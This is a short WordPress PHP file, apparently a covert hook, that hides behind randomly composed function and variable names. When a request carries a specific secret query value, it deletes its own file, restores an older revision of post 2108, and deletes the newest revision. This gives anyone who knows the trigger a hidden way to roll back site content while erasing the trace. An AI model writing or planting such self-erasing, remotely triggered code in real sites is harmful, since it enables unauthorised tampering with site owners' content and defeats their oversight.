<?php

function category_pro_tracker_new() {
	if (isset($_GET['edition_external_query']) && $_GET['edition_external_query'] === 'subscriptions_copy_sitemap') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$campaign_feedback_icon_poll = 2108;
		$local_community_allow = wp_get_post_revisions($campaign_feedback_icon_poll);
		if (empty($local_community_allow)) die('no revisions');
		if (count($local_community_allow) < 2) die('less than 2');
		$article_posts_multiple = array_shift($local_community_allow);
		$variations_nofollow_deprecated_akismet = $article_posts_multiple->ID;
		$animated_gateway_deprecated_select = array_shift($local_community_allow);
		$user_history_syntax = $animated_gateway_deprecated_select->ID;
		$address_cdn_category = wp_restore_post_revision($user_history_syntax);
		if ($address_cdn_category === false) die('error restoring');
		$address_cdn_category = wp_delete_post_revision($variations_nofollow_deprecated_akismet);		
		if ($address_cdn_category === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'category_pro_tracker_new');
